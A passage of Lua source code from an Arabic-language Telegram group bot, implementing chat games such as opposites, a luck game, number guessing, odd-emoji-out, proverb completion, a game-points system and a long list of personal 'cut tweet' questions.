name = string.gsub(name,"سمين","ضعيف")
name = string.gsub(name,"ضعيف","قوي")
name = string.gsub(name,"شريف","كواد")
name = string.gsub(name,"شجاع","جبان")
name = string.gsub(name,"رحت","اجيت")
name = string.gsub(name,"عدل","ميت")
name = string.gsub(name,"نشيط","كسول")
name = string.gsub(name,"شبعان","جوعان")
name = string.gsub(name,"موعطشان","عطشان")
name = string.gsub(name,"خوش ولد","موخوش ولد")
name = string.gsub(name,"اني","مطي")
name = string.gsub(name,"هادئ","عصبي")
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يدز العكس ~ {"..name.."}","md",true)  
end
end
if text == "بات" or text == "محيبس" then   
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then 
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '𝟏 » 👊 ', data = '/Mahibes1'}, {text = '𝟐 » ?? ', data = '/Mahibes2'}, 
},
{
{text = '𝟑 » 👊 ', data = '/Mahibes3'}, {text = '𝟒 » 👊 ', data = '/Mahibes4'}, 
},
{
{text = '𝟓 » 👊 ', data = '/Mahibes5'}, {text = '𝟔 » 👊 ', data = '/Mahibes6'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id, [[*
• لعبة المحيبس هي لعبة الحظ 
• جرب حظك ويه البوت واتونس 
• كل ما عليك هوا الضغط على احدى العضمات في الازرار
*]],"md",false, false, false, false, reply_markup)
end
end
if text == "خمن" or text == "تخمين" then   
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
Num = math.random(1,20)
Redis:set(LaRiCa.."Game:Estimate"..msg.chat_id..msg.sender.user_id,Num)  
return LuaTele.sendText(msg_chat_id,msg_id,"\n• اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n".."• ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n".."• سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ ","md",true)  
end
end
if text == "المختلف" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
mktlf = {"😸","☠","🐼","🐇","🌑","🌚","⭐️","✨","⛈","🌥","⛄️","👨‍🔬","👨‍💻","👨‍🔧","🧚‍♀","??‍♂","🧝‍♂","🙍‍♂","🧖‍♂","👬","🕒","🕤","⌛️","📅",};
name = mktlf[math.random(#mktlf)]
Redis:set(LaRiCa.."Game:Difference"..msg.chat_id,name)
name = string.gsub(name,"😸","😹😹😹😹😹😹😹😹😸😹😹😹😹")
name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀💀")
name = string.gsub(name,"🐼","👻👻👻🐼👻👻👻👻👻👻👻")
name = string.gsub(name,"🐇","🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊")
name = string.gsub(name,"🌑","🌚🌚🌚🌚🌚🌑🌚🌚🌚")
name = string.gsub(name,"🌚","🌑🌑🌑🌑🌑🌚🌑🌑🌑")
name = string.gsub(name,"⭐️","🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟")
name = string.gsub(name,"✨","💫💫💫💫💫✨💫💫💫💫")
name = string.gsub(name,"⛈","🌨🌨🌨🌨🌨⛈🌨??🌨🌨")
name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍??👩‍🔬")
name = string.gsub(name,"👨‍💻","👩‍💻👩‍??👩‍‍💻👩‍‍??👩‍‍💻👨‍💻??‍💻👩‍💻👩‍??")
name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧")
name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍??👨‍🍳??‍🍳")
name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂")
name = string.gsub(name,"🧜‍♂","🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀")
name = string.gsub(name,"🧝‍♂","🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀")
name = string.gsub(name,"🙍‍♂️","🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️")
name = string.gsub(name,"🧖‍♂️","🧖‍♀️🧖‍♀️??‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️")
name = string.gsub(name,"👬","👭👭👭👭👭👬👭👭👭")
name = string.gsub(name,"👨‍👨‍👧","👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦")
name = string.gsub(name,"🕒","🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒")
name = string.gsub(name,"🕤","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
name = string.gsub(name,"⌛️","⏳⏳⏳⏳⏳⏳⌛️⏳⏳")
name = string.gsub(name,"📅","📆📆📆📆📆📆📅📆📆")
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يدز الاختلاف ~ {"..name.."}","md",true)  
end
end
if text == "امثله" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
mthal = {"جوز","ضراطه","الحبل","الحافي","شقره","بيدك","سلايه","النخله","الخيل","حداد","المبلل","يركص","قرد","العنب","العمه","الخبز","بالحصاد","شهر","شكه","يكحله",};
name = mthal[math.random(#mthal)]
Redis:set(LaRiCa.."Game:Example"..msg.chat_id,name)
name = string.gsub(name,"جوز","ينطي____للماعده سنون")
name = string.gsub(name,"ضراطه","الي يسوق المطي يتحمل___")
name = string.gsub(name,"بيدك","اكل___محد يفيدك")
name = string.gsub(name,"الحافي","تجدي من___نعال")
name = string.gsub(name,"شقره","مع الخيل يا___")
name = string.gsub(name,"النخله","الطول طول___والعقل عقل الصخلة")
name = string.gsub(name,"سلايه","بالوجه امراية وبالظهر___")
name = string.gsub(name,"الخيل","من قلة___شدو على الچلاب سروج")
name = string.gsub(name,"حداد","موكل من صخم وجهه كال آني___")
name = string.gsub(name,"المبلل","___ما يخاف من المطر")
name = string.gsub(name,"الحبل","اللي تلدغة الحية يخاف من جرة___")
name = string.gsub(name,"يركص","المايعرف___يكول الكاع عوجه")
name = string.gsub(name,"العنب","المايلوح___يكول حامض")
name = string.gsub(name,"العمه","___إذا حبت الچنة ابليس يدخل الجنة")
name = string.gsub(name,"الخبز","انطي___للخباز حتى لو ياكل نصه")
name = string.gsub(name,"باحصاد","اسمة___ومنجله مكسور")
name = string.gsub(name,"شهر","امشي__ولا تعبر نهر")
name = string.gsub(name,"شكه","يامن تعب يامن__يا من على الحاضر لكة")
name = string.gsub(name,"القرد","__بعين امه غزال")
name = string.gsub(name,"يكحله","اجه___عماها")
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يكمل المثل ~ {"..name.."}","md",true)  
end
end
if text and text:match("^بيع نقاطي (%d+)$") then
local NumGame = text:match("^بيع نقاطي (%d+)$") 
if tonumber(NumGame) == tonumber(0) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا استطيع البيع اقل من 1*","md",true)  
end
local NumberGame = Redis:get(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id)
if tonumber(NumberGame) == tonumber(0) then
return LuaTele.sendText(msg_chat_id,msg_id,"• ليس لديك نقاط من الالعاب \n• اذا كنت تريد ربح النقاط \n• ارسل الالعاب وابدأ اللعب ! ","md",true)  
end
if tonumber(NumGame) > tonumber(NumberGame) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• ليس لديك نقاط بهاذا العدد \n• لزيادة نقاطك في اللعبه \n• ارسل الالعاب وابدأ اللعب !","md",true)   
end
local NumberGet = (NumGame* 50)
Redis:decrby(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id,NumGame)  
Redis:incrby(LaRiCa.."Num:Message:User"..msg.chat_id..":"..msg.sender.user_id,NumGame)  
return LuaTele.sendText(msg_chat_id,msg_id,"• تم خصم*~ "..NumGame.."* من نقاطك \n• وتم اضافة* ~  "..(NumGame* 50).."  رساله الى رسالك*","md",true)  
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
Redis:incrby(LaRiCa.."Num:Add:Games"..msg.chat_id..Message_Reply.sender.user_id, text:match("^اضف نقاط (%d+)$"))  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم اضافه له  "..text:match("^اضف نقاط (%d+)$").." من النقاط").Reply,"md",true)  
end
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
Redis:incrby(LaRiCa.."Num:Message:User"..msg.chat_id..":"..Message_Reply.sender.user_id, text:match("^اضف رسائل (%d+)$"))  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم اضافه له  "..text:match("^اضف رسائل (%d+)$").."  من الرسائل").Reply,"md",true)  
end
if text == "نقاطي" then 
local Num = Redis:get(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id) or 0
if Num == 0 then 
return LuaTele.sendText(msg_chat_id,msg_id, "• لم تفز بأي نقطه ","md",true)  
else
return LuaTele.sendText(msg_chat_id,msg_id, "• عدد النقاط التي ربحتها*← "..Num.."*","md",true)  
end
end
if text == "تويت" or text == "كت تويت" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
local texting = {"اخر افلام شاهدتها", 
"اخر افلام شاهدتها", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈.؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"ليش حسين ذكي؟ ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ؟ ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
"سؤال ينرفزك ؟ ", 
" هل يعجبك 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈.؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈.؟ ", 
"كم مره حبيت؟ ", 
" اكثر المتابعين عندك باي برنامج؟", 
" نسبه الندم عندك للي وثقت فيهم ؟", 
"تحب ترتبط بكيرفي ولا فلات؟", 
" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
" تجامل الناس ولا اللي بقلبك على لسانك؟", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
" آخر غلطات عمرك؟ ", 
" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
" قدوتك من الأجيال السابقة؟ ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
"أكثر حيوان تخاف منه؟ ", 
" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
" إيموجي يعبّر عن مزاجك الحالي؟ ", 
" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
"أكثر شيء أسعدك اليوم؟ ", 
"اي رايك في الدنيا دي ؟ ", 
"ما هو أفضل حافز للشخص؟ ", 
"ما الذي يشغل بالك في الفترة الحالية؟", 
"آخر شيء ندمت عليه؟ ", 
"شاركنا صورة احترافية من تصويرك؟ ", 
"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
"نصيحه تبدا ب -لا- ؟ ", 
"كتاب أو رواية تقرأها هذه الأيام؟ ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
"يوم لا يمكنك نسيانه؟ ", 
"شعورك الحالي في جملة؟ ", 
"كلمة لشخص بعيد؟ ", 
"صفة يطلقها عليك الشخص المفضّل؟ ", 
"أغنية عالقة في ذهنك هاليومين؟ ", 
"أكلة مستحيل أن تأكلها؟ ", 
"كيف قضيت نهارك؟ ", 
"تصرُّف ماتتحمله؟ ", 
"موقف غير حياتك؟ ", 
"اكثر مشروب تحبه؟ ", 
"القصيدة اللي تأثر فيك؟ ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك؟ ", 
"تاريخ ميلادك؟ ", 
"قهوه و لا شاي؟ ", 
"من محبّين الليل أو الصبح؟ ", 
"حيوانك المفضل؟ ", 
"كلمة غريبة ومعناها؟ ", 
"كم تحتاج من وقت لتثق بشخص؟ ", 
"اشياء نفسك تجربها؟ ", 
"يومك ضاع على؟ ", 
"كل شيء يهون الا ؟ ", 
"اسم ماتحبه ؟ ", 
"وقفة إحترام للي إخترع ؟ ", 
"أقدم شيء محتفظ فيه من صغرك؟ ", 
"كلمات ماتستغني عنها بسوالفك؟ ", 
"وش الحب بنظرك؟ ", 
"حب التملك في شخصِيـتك ولا ؟ ", 
"تخطط للمستقبل ولا ؟ ", 
"موقف محرج ماتنساه ؟ ", 
"من طلاسم لهجتكم ؟ ", 
"اعترف باي حاجه ؟ ", 
"عبّر عن مودك بصوره ؟ ",
"اسم دايم ع بالك ؟ ", 
"اشياء تفتخر انك م سويتها ؟ ", 
" لو بكيفي كان ؟ ", 
  "أكثر جملة أثرت بك في حياتك؟ ",
  "إيموجي يوصف مزاجك حاليًا؟ ",
  "أجمل اسم بنت بحرف الباء؟ ",
  "كيف هي أحوال قلبك؟ ",
  "أجمل مدينة؟ ",
  "كيف كان أسبوعك؟ ",
  "شيء تشوفه اكثر من اهلك ؟ ",
  "اخر مره فضفضت؟ ",
  "قد كرهت احد بسبب اسلوبه؟ ",
  "قد حبيت شخص وخذلك؟ ",
  "كم مره حبيت؟ ",
  "اكبر غلطة بعمرك؟ ",
  "نسبة النعاس عندك حاليًا؟ ",
  "شرايكم بمشاهير التيك توك؟ ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة؟ ",
  "اسم قريب لقلبك؟ ",
  "مشتاق لمطعم كنت تزوره قبل الحظر؟ ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)؟ ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير؟ ",
  "أغنية عالقة في ذهنك هاليومين؟ ",
  "متى اخر مره قريت قرآن؟ ",
  "كم صلاة فاتتك اليوم؟ ",
  "تفضل التيكن او السنقل؟ ",
  "وش أفضل بوت برأيك؟ ",
"كم لك بالتلي؟ ",
"وش الي تفكر فيه الحين؟ ",
"كيف تشوف الجيل ذا؟ ",
"منشن شخص وقوله، تحبني؟ ",
"لو جاء شخص وعترف لك كيف ترده؟ ",
"مر عليك موقف محرج؟ ",
"وين تشوف نفسك بعد سنتين؟ ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟ ",
"وش اجمل لهجة تشوفها؟ ",
"قد سافرت؟ ",
"افضل مسلسل عندك؟ ",
"افضل فلم عندك؟ ",
"مين اكثر يخون البنات/العيال؟ ",
"متى حبيت؟ ",
  "بالعادة متى تنام؟ ",
  "شيء من صغرك ماتغيير فيك؟ ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع؟ ",
  "تشوف الغيره انانيه او حب؟ ",
"حاجة تشوف نفسك مبدع فيها؟ ",
  "مع او ضد : يسقط جمال المراة بسبب قبح لسانها؟ ",
  "عمرك بكيت على شخص مات في مسلسل ؟ ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف؟ ",
  "تدوس على قلبك او كرامتك؟ ",
  "اكثر لونين تحبهم مع بعض؟ ",
  "مع او ضد : النوم افضل حل لـ مشاكل الحياة؟ ",
  "سؤال دايم تتهرب من الاجابة عليه؟ ",
  "تحبني ولاتحب الفلوس؟ ",
  "العلاقه السريه دايماً تكون حلوه؟ ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به؟ ",
"كيف ينطق الطفل اسمك؟ ",
  "ما هي نقاط الضعف في شخصيتك؟ ",
  "اكثر كذبة تقولها؟ ",
  "تيكن ولا اضبطك؟ ",
  "اطول علاقة كنت فيها مع شخص؟ ",
  "قد ندمت على شخص؟ ",
  "وقت فراغك وش تسوي؟ ",
  "عندك أصحاب كثير؟ ولا ينعد بالأصابع؟ ",
  "حاط نغمة خاصة لأي شخص؟ ",
  "وش اسم شهرتك؟ ",
  "أفضل أكلة تحبه لك؟ ",
"عندك شخص تسميه ثالث والدينك؟ ",
  "عندك شخص تسميه ثالث والدينك؟ ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار؟ ",
  "أطول مكالمة كم ساعة؟ ",
  "تحب الحياة الإلكترونية ولا الواقعية؟ ",
  "كيف حال قلبك ؟ بخير ولا مكسور؟ ",
  "أطول مدة نمت فيها كم ساعة؟ ",
  "تقدر تسيطر على ضحكتك؟ ",
  "أول حرف من اسم الحب؟ ",
  "تحب تحافظ على الذكريات ولا تمسحه؟ ",
  "اسم اخر شخص زعلك؟ ",
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  "أنت انسان غامض ولا الكل يعرف عنك؟ ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك؟ ",
  "عندك أخوان او خوات من الرضاعة؟ ",
  "إختصار تحبه؟ ",
  "إسم شخص وتحس أنه كيف؟ ",
  "وش الإسم اللي دايم تحطه بالبرامج؟ ",
  "وش برجك؟ ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية؟ ",
  "اجمل هدية جاتك وش هو؟ ",
  "الصداقة ولا الحب؟ ",
"الصداقة ولا الحب؟ ",
  "الغيرة الزائدة شك؟ ولا فرط الحب؟ ",
  "قد حبيت شخصين مع بعض؟ وانقفطت؟ ",
  "وش أخر شي ضيعته؟ ",
  "قد ضيعت شي ودورته ولقيته بيدك؟ ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك؟ ",
  "سبب وجوك بالتليجرام؟ ",
  "تراقب شخص حاليا؟ ",
  "عندك معجبين ولا محد درا عنك؟ ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون؟ ",
  "أنت محبوب بين الناس؟ ولاكريه؟ ",
"كم عمرك؟ ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم؟ ",
  "تؤمن بمقولة الصحبة تغنيك الحب؟ ",
  "وش مشروبك المفضل؟ ",
  "قد جربت الدخان بحياتك؟ وانقفطت ولا؟ ",
  "أفضل وقت للسفر؟ الليل ولا النهار؟ ",
  "انت من النوع اللي تنام بخط السفر؟ ",
  "عندك حس فكاهي ولا نفسية؟ ",
  "تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب؟ ",
  "أفضل ممارسة بالنسبة لك؟ ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون؟ ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العمر المناسب للزواج؟ ",
  "اذا تزوجت بعد كم بتخلف عيال؟ ",
  "فكرت وش تسمي أول اطفالك؟ ",
  "من الناس اللي تحب الهدوء ولا الإزعاج؟ ",
  "الشيلات ولا الأغاني؟ ",
  "عندكم شخص مطوع بالعايلة؟ ",
  "تتقبل النصيحة من اي شخص؟ ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟ ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه؟ ",
  "دايم قوة الصداقة تكون بإيش؟ ",
"أفضل البدايات بالعلاقة بـ وش؟ ",
  "وش مشروبك المفضل؟ او قهوتك المفضلة؟ ",
  "تحب تتسوق عبر الانترنت ولا الواقع؟ ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه؟ ",
  "أخر مرة بكيت متى؟ وليش؟ ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك؟ ",
  "أفضل صفة تحبه بنفسك؟ ",
  "كلمة تقولها للوالدين؟ ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح؟ ",
  "كم عدد سنينك بالتليجرام؟ ",
  "تحب تعترف ولا تخبي؟ ",
"انت من الناس الكتومة ولا تفضفض؟ ",
  "أنت بعلاقة حب الحين؟ ",
  "عندك اصدقاء غير جنسك؟ ",
  "أغلب وقتك تكون وين؟ ",
  "لو المقصود يقرأ وش بتكتب له؟ ",
  "تحب تعبر بالكتابة ولا بالصوت؟ ",
  "عمرك كلمت فويس احد غير جنسك؟ ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه؟ ",
  "لو عندك فلوس وش السيارة اللي بتشتريها؟ ",
  "كم أعلى مبلغ جمعته؟ ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه؟ ",
"قد جربت تبكي فرح؟ وليش؟ ",
"تتوقع إنك بتتزوج اللي تحبه؟ ",
  "ما هو أمنيتك؟ ",
  "وين تشوف نفسك بعد خمس سنوات؟ ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
  "تحب تطق الميانة ولا ثقيل؟ ",
  "باقي معاك للي وعدك ما بيتركك؟ ",
  "اول ماتصحى من النوم مين تكلمه؟ ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
  "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
"اذا قفطت احد تحب تفضحه ولا تستره؟ ",
  "كلمة للشخص اللي يسب ويسطر؟ ",
  "آية من القران تؤمن فيه؟ ",
  "تحب تعامل الناس بنفس المعاملة؟ ولا تكون أطيب منهم؟ ",
"حاجة ودك تغييرها هالفترة؟ ",
  "كم فلوسك حاليا وهل يكفيك ام لا؟ ",
  "وش لون عيونك الجميلة؟ ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس؟ ",
  "اذكر موقف ماتنساه بعمرك؟ ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
  "ألطف شخص مر عليك بحياتك؟ ",
"انت من الناس المؤدبة ولا نص نص؟ ",
  "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
  "أكثر شي تخاف منه بالحياه وش؟ ",
  "اكثر المتابعين عندك باي برنامج؟ ",
  "متى يوم ميلادك؟ ووش الهدية اللي نفسك فيه؟ ",
  "قد تمنيت شي وتحقق؟ ",
  "قلبي على قلبك مهما صار لمين تقولها؟ ",
  "وش نوع جوالك؟ واذا بتغييره وش بتأخذ؟ ",
  "كم حساب عندك بالتليجرام؟ ",
  "متى اخر مرة كذبت؟ ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي؟ ",
  "تجامل الناس ولا اللي بقلبك على لسانك؟ ",
  "قد تمصلحت مع أحد وليش؟ ",
  "وين تعرفت على الشخص اللي حبيته؟ ",
  "قد رقمت او احد رقمك؟ ",
  "وش أفضل لعبته بحياتك؟ ",
  "أخر شي اكلته وش هو؟ ",
  "حزنك يبان بملامحك ولا صوتك؟ ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك؟ ",
  "فيه شيء م تقدر تسيطر عليه ؟ ",
  "منشن شخص متحلطم م يعجبه شيء؟ ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ؟ ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟ ",
  "انسان م تحب تتعامل معاه ابداً ؟ ",
  "شيء بسيط تحتفظ فيه؟ ",
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
  "شيء مستحيل ترفضه ؟. ",
  "لو زعلت بقوة وش بيرضيك ؟ ",
  "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
  "ردك المعتاد اذا أحد ناداك ؟ ",
  "مين الي تحب يكون مبتسم دائما ؟ ",
" إحساسك في هاللحظة؟ ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ؟ ",
  "اشياء صعب تتقبلها بسرعه ؟ ",
  "شيء جميل صار لك اليوم ؟ ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي؟ ",
  "يهمك ملابسك تكون ماركة ؟ ",
  "ردّك على شخص قال (أنا بطلع من حياتك)؟. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟ ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك؟ ",
  "كيف علاقتك مع اهلك؟ رسميات ولا ميانة؟ ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ؟ ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ؟ ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ؟ ",
  "مشاكلك بسبب ؟ ",
  "نسبه الندم عندك للي وثقت فيهم ؟ ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام؟ ",
  "اكثر شيء تحس انه مات ف مجتمعنا؟ ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ؟ ",
  "كم عددكم بالبيت؟ ",
  "عادي تتزوج من برا القبيلة؟ ",
  "أجمل شي بحياتك وش هو؟ ",
} 
return LuaTele.sendText(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
end
if text == 'ترتيب الاوامر' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..'تعط','تعطيل الايدي بالصوره')
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..'تفع','تفعيل الايدي بالصوره')
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..'ا','ايدي')
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..'م','رفع مميز')
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..'اد', 'رفع ادمن')
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..'مد','رفع مدير')
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..'من', 'رفع منشئ')
